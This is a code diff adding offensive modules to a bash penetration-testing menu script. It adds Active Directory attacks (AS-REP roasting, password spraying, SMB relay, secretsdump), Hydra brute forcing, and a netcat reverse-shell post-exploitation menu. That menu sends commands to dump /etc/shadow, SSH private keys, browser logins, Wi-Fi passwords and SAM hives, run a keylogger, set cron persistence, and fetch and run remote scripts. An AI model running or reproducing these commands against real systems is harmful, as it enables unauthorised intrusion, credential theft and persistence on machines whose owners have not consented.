@@ -1350,7 +1350,7 @@ osint_spiderfoot() {
     echo -e "30) sfp_virustotal            - Obtain information from VirusTotal about identified IP addresses."
     echo -e "31) Enter other module manually"
 
-    read -p "Option: " spiderfoot_option
+    read -e -p "Option: " spiderfoot_option
     clear
     case $spiderfoot_option in
         1) module="sfp_abstractapi" ;;
@@ -1462,7 +1462,8 @@ web_tools_menu() {
         echo -e "1) WhatWeb scan"
         echo -e "2) Nikto scan"
         echo -e "3) Gobuster Scan"
-        echo -e "4) Back to Main Menu"
+        echo -e "4) Subdomain Scan"
+        echo -e "5) Back to Main Menu"
         read -e -p "Option: " web_tools_option
 
         clear
@@ -1533,6 +1534,11 @@ web_tools_menu() {
                 ;;
             4)
                 clear
+                show_info_panel
+                subdomain_enumeration
+                ;;
+            5)
+                clear
                 break
                 ;;
             *)
@@ -1540,6 +1546,12 @@ web_tools_menu() {
                 ;;
         esac
     done
+}
+
+subdomain_enumeration() {
+    read -e -p "Enter the domain to enumerate subdomains: " domain
+    echo -e "${YELLOW}[+] Enumerating subdomains for $domain...${NC}"
+    sublist3r -d $domain
 }
 
 # Function to download tools
@@ -1552,7 +1564,7 @@ download_tools() {
     echo -e "4) WinPEAS"
     echo -e "5) LinPEAS"
     echo -e "6) Back to Main Menu"
-    read -p "Enter your choice: " tool_choice
+    read -e -p "Enter your choice: " tool_choice
     clear
 
     case $tool_choice in
@@ -1561,7 +1573,7 @@ download_tools() {
             echo -e "1) Linux latest"
             echo -e "2) Windows V1.7.3"
             echo -e "3) Back to Main Menu"
-            read -p "Enter your choice: " socat_version
+            read -e -p "Enter your choice: " socat_version
             case $socat_version in
                 1) 
                     wget -P "$BASE_DIR/tools" "https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat"
@@ -1589,7 +1601,7 @@ download_tools() {
             echo -e "3) Windows V1.9.1"
             echo -e "4) Windows V1.7.3"
             echo -e "5) Back to Main Menu"
-            read -p "Enter your choice: " chisel_version
+            read -e -p "Enter your choice: " chisel_version
             case $chisel_version in
                 1) 
                     wget -P "$BASE_DIR/tools" "https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz"
@@ -1859,8 +1871,438 @@ osint_nuclei() {
     echo -e "${GREEN}[+] Nuclei scan completed. Results saved in $output_file${NC}"
 }
 
+# Function to check if port 445 is open
+check_port_445() {
+    if [[ ! $OPEN_PORTS =~ "445" ]]; then
+        echo -e "${YELLOW}[!] Warning: Port 445 is not detected as open.${NC}"
+        read -e -p "Do you want to continue? (y/n): " choice
+        if [[ $choice != "y" && $choice != "Y" ]]; then
+            return 1
+        fi
+    fi
+    return 0
+}
+
+# Function to show Active Directory tools
+show_ad_tools() {
+    check_port_445
+    if [ $? -ne 0 ]; then
+        return
+    fi
+
+    while true; do
+        echo -e "${BLUE}[+] Active Directory Tools:${NC}"
+        echo -e "1) BloodHound"
+        echo -e "2) ldapsearch"
+        echo -e "3) enum4linux"
+        echo -e "4) Impacket"
+        echo -e "5) CrackMapExec"
+        echo -e "6) SMB Enumeration"
+        echo -e "7) Kerberos Enumeration"
+        echo -e "8) DNS Enumeration"
+        echo -e "9) AS-REP Roasting"
+        echo -e "10) Password Spraying"
+        echo -e "11) SMB Relay Attack"
+        echo -e "12) LDAP Enumeration"
+        echo -e "13) Back to Main Menu"
+        read -e -p "Select an option: " ad_option
+
+        case $ad_option in
+            1) run_bloodhound ;;
+            2) run_ldapsearch ;;
+            3) run_enum4linux ;;
+            4) run_impacket ;;
+            5) run_cme ;;
+            6) smb_enumeration ;;
+            7) kerberos_enumeration ;;
+            8) dns_enumeration ;;
+            9) asrep_roasting ;;
+            10) password_spraying ;;
+            11) smb_relay ;;
+            12) ldap_enumeration ;;
+            13) break ;;
+            *) echo -e "${RED}Invalid option. Please try again.${NC}" ;;
+        esac
+    done
+}
+
+# Function to run BloodHound
+run_bloodhound() {
+    echo -e "${BLUE}[+] Running BloodHound...${NC}"
+    sudo apt-get install bloodhound -y
+    neo4j start
+    bloodhound
+}
+
+# Function to run ldapsearch
+run_ldapsearch() {
+    read -e -p "Enter LDAP server address: " ldap_server
+    read -e -p "Enter search base (e.g., dc=example,dc=com): " search_base
+    echo -e "${BLUE}[+] Running ldapsearch...${NC}"
+    ldapsearch -x -H ldap://$ldap_server -b $search_base
+}
+
+# Function to run enum4linux
+run_enum4linux() {
+    read -e -p "Enter target IP: " target_ip
+    echo -e "${BLUE}[+] Running enum4linux...${NC}"
+    enum4linux -a $target_ip
+}
+
+# Function to run Impacket tools
+run_impacket() {
+    echo -e "${BLUE}[+] Running Impacket tools...${NC}"
+    echo -e "1) GetNPUsers"
+    echo -e "2) GetUserSPNs"
+    echo -e "3) SecretsDump"
+    echo -e "4) SMBClient"
+    read -e -p "Select an Impacket tool: " impacket_option
+
+    case $impacket_option in
+        1)
+            read -e -p "Enter target IP: " target_ip
+            read -e -p "Enter domain name: " domain
+            read -e -p "Enter username: " username
+            GetNPUsers.py $domain/$username -no-pass -dc-ip $target_ip
+            ;;
+        2)
+            read -e -p "Enter target IP: " target_ip
+            read -e -p "Enter domain name: " domain
+            read -e -p "Enter username: " username
+            GetUserSPNs.py $domain/$username -dc-ip $target_ip
+            ;;
+        3)
+            read -e -p "Enter target IP: " target_ip
+            read -e -p "Enter domain name: " domain
+            read -e -p "Enter username: " username
+            read -s -p "Enter password: " password
+            secretsdump.py $domain/$username:$password@$target_ip
+            ;;
+        4)
+            read -e -p "Enter target IP: " target_ip
+            read -e -p "Enter domain name: " domain
+            read -e -p "Enter username: " username
+            read -s -p "Enter password: " password
+            smbclient.py $domain/$username:$password@$target_ip
+            ;;
+        *)
+            echo -e "${RED}Invalid option. Please try again.${NC}"
+            ;;
+    esac
+}
+
+# Function to run CrackMapExec
+run_cme() {
+    read -e -p "Enter target IP: " target_ip
+    echo -e "${BLUE}[+] Running CrackMapExec...${NC}"
+    crackmapexec smb $target_ip
+}
+
+# Function for SMB Enumeration
+smb_enumeration() {
+    read -e -p "Enter target IP: " target_ip
+    echo -e "${BLUE}[+] Running SMB Enumeration...${NC}"
+    smbclient -L \\$target_ip -N
+}
+
+# Function for Kerberos Enumeration
+kerberos_enumeration() {
+    read -e -p "Enter target IP: " target_ip
+    echo -e "${BLUE}[+] Running Kerberos Enumeration...${NC}"
+    nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='YOUR_REALM' $target_ip
+}
+
+# Function for DNS Enumeration
+dns_enumeration() {
+    read -e -p "Enter domain: " domain
+    echo -e "${BLUE}[+] Running DNS Enumeration...${NC}"
+    dnsrecon -d $domain
+}
+
+# Function for AS-REP Roasting
+asrep_roasting() {
+    read -e -p "Enter domain: " domain
+    echo -e "${BLUE}[+] Running AS-REP Roasting...${NC}"
+    GetNPUsers.py -dc-ip $target_ip -no-pass $domain/
+}
+
+# Function for Password Spraying
+password_spraying() {
+    read -e -p "Enter target IP: " target_ip
+    read -e -p "Enter domain: " domain
+    read -e -p "Enter username list file: " user_list
+    read -s -p "Enter password: " password
+    echo -e "\n${BLUE}[+] Running Password Spraying...${NC}"
+    crackmapexec smb $target_ip -u $user_list -p $password
+}
+
+# Function for SMB Relay Attack
+smb_relay() {
+    read -e -p "Enter target IP: " target_ip
+    echo -e "${BLUE}[+] Running SMB Relay Attack...${NC}"
+    ntlmrelayx.py -smb2support -t $target_ip
+}
+
+# Function for LDAP Enumeration
+ldap_enumeration() {
+    read -e -p "Enter LDAP server address: " ldap_server
+    echo -e "${BLUE}[+] Running LDAP Enumeration...${NC}"
+    ldapsearch -x -H ldap://$ldap_server -b "dc=example,dc=com"
+}
+
+# Function for Hydra Brute Force Attack
+brute_force_attack() {
+    read -e -p "Enter the target IP: " target_ip
+
+    echo -e "${BLUE}[+] Select the protocol to brute force:${NC}"
+    protocols=("ssh" "ftp" "ftp" "mysql" "rdp")
+    select protocol in "${protocols[@]}"; do
+        case $protocol in
+            ssh|ftp|smb|mysql|rdp)
+                echo -e "${GREEN}Selected protocol: $protocol${NC}"
+                break
+                ;;
+            *)
+                echo -e "${RED}Invalid option. Please select a valid protocol.${NC}"
+                ;;
+        esac
+    done
+
+    read -e -p "Do you want to specify a username or use a user dictionary? (u/d): " user_choice
+    if [ "$user_choice" == "u" ]; then
+        read -e -p "Enter the username: " username
+    else
+        echo -e "${BLUE}[+] Select a user dictionary:${NC}"
+        user_dictionaries=("/usr/share/metasploit-framework/data/wordlists/unix_users.txt" "/usr/share/metasploit-framework/data/wordlists/common_users.txt" "Custom")
+        select user_dict in "${user_dictionaries[@]}"; do
+            case $user_dict in
+                "Custom")
+                    read -e -p "Enter the path to the user dictionary: " user_dict
+                    ;;
+                *)
+                    echo -e "${GREEN}Selected user dictionary: $user_dict${NC}"
+                    ;;
+            esac
+            break
+        done
+    fi
+
+    read -e -p "Do you want to specify a password or use a password dictionary? (p/d): " pass_choice
+    if [ "$pass_choice" == "p" ]; then
+        read -e -p "Enter the password: " password
+    else
+        echo -e "${BLUE}[+] Select a password dictionary:${NC}"
+        pass_dictionaries=("/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt" "/usr/share/metasploit-framework/data/wordlists/common_passwords.txt" "/usr/share/wordlists/rockyou.txt" "Custom")
+        select pass_dict in "${pass_dictionaries[@]}"; do
+            case $pass_dict in
+                "Custom")
+                    read -e -p "Enter the path to the password dictionary: " pass_dict
+                    ;;
+                *)
+                    echo -e "${GREEN}Selected password dictionary: $pass_dict${NC}"
+                    ;;
+            esac
+            break
+        done
+    fi
+
+    read -e -p "Enter the number of threads (default is 16, recommended up to 64): " threads
+    threads=${threads:-16}
+
+    fecha=$(date +%Y%m%d_%H%M%S)
+    result_file="$BASE_DIR/loot/hydra_${protocol}_${fecha}.txt"
+
+    echo -e "${YELLOW}[+] Starting $protocol brute force attack on $target_ip...${NC}"
+
+    if [ "$user_choice" == "u" ]; then
+        if [ "$pass_choice" == "p" ]; then
+            hydra -l "$username" -p "$password" -t "$threads" -o "$result_file" "$protocol://$target_ip" 
+        else
+            hydra -l "$username" -P "$pass_dict" -t "$threads" -o "$result_file" "$protocol://$target_ip"
+        fi
+    else
+        if [ "$pass_choice" == "p" ]; then
+            hydra -L "$user_dict" -p "$password" -t "$threads" -o "$result_file" "$protocol://$target_ip"
+        else
+            hydra -L "$user_dict" -P "$pass_dict" -t "$threads" -o "$result_file" "$protocol://$target_ip"
+        fi
+    fi
+
+    echo -e "${GREEN}[+] Brute force attack complete. Results saved to $result_file${NC}"
+}
+
+# Function for Port Knocking
+port_knocking() {
+    read -e -p "Enter the IP address to knock: " ip
+    read -e -p "Enter the sequence of ports (example: 3000,4000,5000): " ports
+    echo -e "${YELLOW}[+] Port knocking on $ip with ports $ports...${NC}"
+    for port in ${ports//,/ }; do
+        nc -zv $ip $port
+    done
+}
+
+# Function to generate dictionary passwords using CUPP
+generate_passwords_cupp() {
+    # Ensure CUPP is available
+    if [ ! -d "cupp" ]; then
+        echo -e "${RED}[!] CUPP directory not found. Cloning CUPP from GitHub...${NC}"
+        git clone https://github.com/Mebus/cupp.git || { echo -e "${RED}Failed to clone CUPP repository.${NC}"; return; }
+    fi
+
+    # Change to CUPP directory
+    cd cupp || { echo -e "${RED}Failed to enter CUPP directory.${NC}"; return; }
+
+    # Run CUPP with interactive mode
+    echo -e "${BLUE}[+] Running CUPP...${NC}"
+    python3 cupp.py -i
+
+    # Return to the original directory
+    cd ..
+    echo -e "${GREEN}[+] CUPP dictionary will be saved at /cupp/name_of_the_person.txt directory...${NC}"
+}
+
+# Function to clean up and close the Netcat listener
+cleanup() {
+    echo -e "${RED}[+] Exiting ...${NC}"
+    echo -e "${BLUE}[+] Thanks for use ${VIOLET}EnumeRannden${BLUE}!${NC}"
+    tmux kill-session -t nc_listener 2>/dev/null
+    exit 0
+}
+
+# Trap SIGINT (Ctrl + C) to run the cleanup function
+trap cleanup SIGINT
+
+# Function to handle post-exploitation tasks
+post_exploitation() {
+    echo -e "${BLUE}[+] Post-Exploitation Menu:${NC}"
+    read -e -p "Enter the port to listen on: " listen_port
+    echo -e "${BLUE}Setting up Netcat listener on port $listen_port...${NC}"
+
+    # Create a new tmux session for the Netcat listener
+    tmux new-session -d -s nc_listener "nc -lvnp $listen_port > /tmp/nc_output.txt"
+
+    echo -e "${RED}You can now run the reverse shell... ${NC}"
+    echo
+    echo -e "${YELLOW}[+] Select a post-exploitation option: ${NC}"
+    read -e -p "Is the shell Linux or Windows? (l/w): " shell_type
+    echo
+    while true; do
+        echo -e "${BLUE}[+] Select a post-exploitation module: ${NC}"
+        echo -e "1) Gather System Information"
+        echo -e "2) Enumerate Users and Groups"
+        echo -e "3) Check for Sudo Permissions"
+        echo -e "4) Search for Sensitive Files"
+        echo -e "5) Network Information"
+        echo -e "6) Extract Password Hashes"
+        echo -e "7) Keylogging (Only Linux Suported)"
+        echo -e "8) Exploit Suggester LinPEAS / WinPEAS"
+        echo -e "9) List Scheduled Tasks"
+        echo -e "10) List Installed Software"
+        echo -e "11) Collect Browser Data"
+        echo -e "12) Dump SSH Keys"
+        echo -e "13) Monitor Network Traffic"
+        echo -e "14) Collect Wi-Fi Passwords"
+        echo -e "15) List Running Processes"
+        echo -e "16) Check for Virtual Machines"
+        echo -e "17) Extract (Linux - SSH) / (Windows - RDP) Configuration"
+        echo -e "18) Extract Environment Variables"
+        echo -e "19) List Open Files"
+        echo -e "20) Enumerate Installed Services"
+        echo -e "21) Close Netcat Connection and Back to Main Menu"
+        read -e -p "Select an option: " post_option
+
+        if [ "$shell_type" == "l" ]; then
+            case $post_option in
+                1) send_command "uname -a && lsb_release -a" 2;;
+                2) send_command "cat /etc/passwd && cat /etc/group" 2;;
+                3) send_command "sudo -l" 2;;
+                4) send_command "find / -type f -name '*password*'" 2;;
+                5) send_command "ip a && ifconfig && netstat -an" 2;;
+                # 6) send_command "wget -O /tmp/privesc.sh http://example.com/privesc.sh && bash /tmp/privesc.sh" 2;; #Cambiar url
+                # 7) send_command "crontab -l && echo '*/5 * * * * /path/to/payload' | crontab -" 2;; #Cambiar directorio
+                6) send_command "cat /etc/shadow" 2;;
+                7) send_command "nohup /usr/bin/logger -t keylogger -p user.info $(xinput test-xi2 --root | grep --line-buffered RawKeyPress | sed 's/.*detail: //' | tr -d '[:blank:]' | tr '\n' ' ') &" 2;;
+                8) send_command "wget -O /tmp/linpeas.sh https://github.com/peass-ng/PEASS-ng/releases/download/20240609-52b58bf5/linpeas_linux_amd64 && bash /tmp/linpeas.sh" 2;;
+                9) send_command "crontab -l && ls -al /etc/cron* && systemctl list-timers" 2;;
+                10) send_command "dpkg -l || rpm -qa" 2;;
+                11) send_command "find ~/.mozilla ~/.config/chromium -name '*.sqlite' -exec sqlite3 {} 'SELECT * FROM logins' \;" 2;;
+                12) send_command "cat ~/.ssh/id_rsa" 2;; 
+                13) send_command "tcpdump -i any -w /tmp/traffic.pcap && cat /tmp/traffic.pcap" 2;;
+                14) send_command "grep -r '^psk=' /etc/NetworkManager/system-connections/" 2;;
+                15) send_command "ps aux" 2;;
+                16) send_command "dmesg | grep -i virtual && lscpu | grep Hypervisor" 2;;
+                17) send_command "cat /etc/ssh/sshd_config" 2;;
+                18) send_command "printenv" 2;;
+                19) send_command "lsof" 2;;
+                20) send_command "systemctl list-units --type=service" 2;;
+                21) break ;;
+                *) echo -e "${RED}Invalid option. Please try again.${NC}" ;;
+            esac
+        elif [ "$shell_type" == "w" ]; then
+            case $post_option in
+                1) send_command "systeminfo" 2;;
+                2) send_command "net user && net localgroup" 2;;
+                3) send_command "whoami /priv" 2;;
+                4) send_command "dir /s /b *password*.txt" 2;;
+                5) send_command "ipconfig /all && netstat -an" 2;;
+                # 6) send_command "powershell -ep bypass -file C:\\path\\to\\privesc_script.ps1" 2;;
+                # 7) send_command "schtasks /create /sc onlogon /tn MyTask /tr C:\\path\\to\\payload.exe" 2;;
+                6) send_command "reg save hklm\\sam C:\\Windows\\Temp\\sam.save && reg save hklm\\system C:\\Windows\\Temp\\system.save" 2;;
+                7) echo -e "${RED}Only Linux Suported.${NC}" ;;
+                8) send_command "certutil.exe -urlcache -f https://github.com/peass-ng/PEASS-ng/releases/download/20240609-52b58bf5/winPEASx64.exe C:\\win.exe && powershell -ep bypass -file C:\\win.exe" 2;;
+                9) send_command "schtasks /query /fo LIST /v" 2;;
+                10) send_command "wmic product get name,version" 2;;
+                11) send_command "powershell -ep bypass -file C:\\path\\to\\browser_data_collector.ps1" 2;; #Cambiar directorio
+                12) send_command "type C:\\Users\\%USERNAME%\\.ssh\\id_rsa" 2;;
+                13) send_command "powershell -ep bypass -file C:\\path\\to\\network_monitor.ps1" 2;; #Cambiar directorio
+                14) send_command "netsh wlan show profile name=* key=clear" 2;;
+                15) send_command "tasklist" 2;;   
+                16) send_command "wmic computersystem get model" 2;;
+                17) send_command "reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\"" 2;;
+                18) send_command "set" 2;;
+                19) send_command "net file" 2;;
+                20) send_command "net start" 2;;
+                21) break ;;
+                *) echo -e "${RED}Invalid option. Please try again.${NC}" ;;
+            esac
+        else
+            echo -e "${RED}Invalid shell type. Please enter 'l' for Linux or 'w' for Windows.${NC}"
+        fi
+
+        # Display the output from the reverse shell
+        echo -e "${VIOLET}\n\n\n=========================================================================="
+        echo -e "============================ ${YELLOW}Used module: ($post_option) ${VIOLET}============================"
+        echo -e "==========================================================================${NC}"
+        echo -e "${GREEN}"
+        sed '$d' /tmp/nc_output.txt
+        echo -e "${NC}"
+        echo
+        echo "" > /tmp/nc_output.txt
+    done
+
+    # Kill the tmux session after post-exploitation tasks are done
+    tmux kill-session -t nc_listener
+}
+
+# Function to send command to the reverse shell
+send_command() {
+    local cmd="$1"
+    local delay="$2"
+    clear
+    tmux send-keys -t nc_listener "$cmd" C-m
+    echo -e "${YELLOW}[+] Waiting for $delay seconds...${NC}"
+
+    # Countdown timer
+    for ((i = delay; i > 0; i--)); do
+        echo -ne "$i\033[0K\r"
+        sleep 1
+    done
+
+    echo -e "${GREEN}[+] Capturing output...${NC}"
+}
+
 check_install_dependencies() {
-    dependencies=("nmap" "whatweb" "nikto" "gobuster" "hashcat" "python3-pip" "finalrecon" "theharvester" "recon-ng" "nuclei" "wkhtmltopdf")
+    dependencies=("nmap" "whatweb" "nikto" "gobuster" "hashcat" "python3-pip" "finalrecon" "theharvester" "recon-ng" "nuclei" "tmux" "wkhtmltopdf")
 
     echo -e "${BLUE}[+] Checking and installing dependencies...${NC}"
 
@@ -1869,8 +2311,8 @@ check_install_dependencies() {
             echo -e "${YELLOW}[-] $dep is not installed. Installing...${NC}"
             if [[ $dep == "theharvester" ]]; then
                 pip install theHarvester
-            elif [[ $dep == "nuclei" || $dep == "finalrecon" ]]; then
-                sudo apt install -y nuclei
+            elif [[ $dep == "nuclei" || $dep == "finalrecon" || $dep == "tmux" ]]; then
+                sudo apt install -y $dep
             else
                 sudo apt-get install -y $dep
             fi
@@ -1898,15 +2340,20 @@ main_menu() {
         echo -e "2) Create directories"
         echo -e "3) NMAP scans"
         echo -e "4) Web Tools"
-        echo -e "5) OSINT Tools"
-        echo -e "6) Exploit Tools"
-        echo -e "7) CheatSheets"
-        echo -e "8) Hash Crack"
-        echo -e "9) Reverse Shell Generator"
-        echo -e "10) Download Tools"
-        echo -e "11) Generate Report"
-        echo -e "12) Check and Install Dependencies"
-        echo -e "13) Save & Exit"
+        echo -e "5) Brute Force Attack"
+        echo -e "6) Create a Presonalized Dictionary"
+        echo -e "7) Port Knocking"
+        echo -e "8) OSINT Tools"
+        echo -e "9) Exploit Tools"
+        echo -e "10) CheatSheets"
+        echo -e "11) Hash Crack"
+        echo -e "12) Active Directory Tools"
+        echo -e "13) Reverse Shell Generator"
+        echo -e "14) Post-Explotation"
+        echo -e "15) Download Tools"
+        echo -e "16) Generate Report"
+        echo -e "17) Check and Install Dependencies"
+        echo -e "18) Save & Exit"
         read -e -p "Option: " main_option
 
         clear
@@ -1926,30 +2373,45 @@ main_menu() {
                 web_tools_menu
                 ;;
             5)
-                osint_tools_menu
+                brute_force_attack
                 ;;
             6)
-                exploit_tools_menu
+                generate_passwords_cupp
                 ;;
             7)
-                show_cheatsheets
+                port_knocking
                 ;;
             8)
-                crack_with_hashcat
+                osint_tools_menu
                 ;;
             9)
-                generate_reverse_shell
+                exploit_tools_menu
                 ;;
             10)
-                download_tools
+                show_cheatsheets
                 ;;
             11)
-                save_report
+                crack_with_hashcat
                 ;;
             12)
-                check_install_dependencies
+                show_ad_tools
                 ;;
             13)
+                generate_reverse_shell
+                ;;
+            14) 
+                post_exploitation
+                ;;
+            15)
+                download_tools
+                ;;
+            16)
+                save_report
+                ;;
+            17)
+                check_install_dependencies
+                ;;
+            18)
                 save_results
                 echo -e "${GREEN}[+] Exiting the script.${NC}"
                 exit 0
